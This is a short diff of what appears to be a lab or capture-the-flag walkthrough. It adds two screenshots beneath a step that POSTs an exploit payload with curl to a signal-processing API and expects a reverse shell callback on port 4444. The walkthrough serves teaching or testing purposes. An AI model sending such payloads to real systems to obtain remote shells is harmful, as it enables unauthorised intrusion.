@@ -63,8 +63,11 @@ curl -s -X POST http://<M4-IP>:5000/api/signal/process \
   -H "Content-Type: application/json" \
   -d "{\"payload\":\"${PAYLOAD}\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
 ```
+<img width="876" height="216" alt="image" src="https://github.com/user-attachments/assets/10d4b8f7-2ab7-4d6d-9cba-79bf0de75928" />
 
 You should receive a shell callback on port 4444.
+
+<img width="1066" height="264" alt="image" src="https://github.com/user-attachments/assets/da7bcf00-cfd3-4983-8ad5-5d8a7436b2ce" />
 
 ---
 
